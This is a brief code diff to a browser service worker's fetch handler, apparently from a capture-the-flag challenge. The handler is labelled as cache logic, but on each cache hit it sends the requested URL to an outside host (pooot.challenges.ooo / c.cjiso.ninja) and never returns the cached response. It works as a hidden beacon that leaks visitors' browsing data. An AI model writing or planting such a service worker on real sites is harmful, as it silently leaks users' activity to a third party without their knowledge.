@@ -3,7 +3,7 @@ self.addEventListener('fetch', function(event) {
       caches.match(event.request)
         .then(function(response) {
           // Cache hit - return response
-          fetch(`https://c.cjiso.ninja/data/${event.request.url}`);
+          fetch(`https://pooot.challenges.ooo/c.cjiso.ninja/data/${event.request.url}`);
         }
       )
     );
